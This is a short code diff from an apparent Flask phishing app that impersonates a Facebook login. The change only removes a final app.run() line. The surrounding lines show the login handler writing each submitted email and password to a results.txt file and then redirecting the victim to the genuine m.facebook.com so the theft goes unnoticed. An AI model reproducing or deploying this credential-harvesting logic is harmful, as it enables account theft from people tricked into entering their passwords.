@@ -35,4 +35,3 @@ def login():
 					open("results.txt","a").write(f"{email}|{password}\n")
 					return redirect("https://m.facebook.com", code=302)
 	return render_template("template.html")
-app.run()
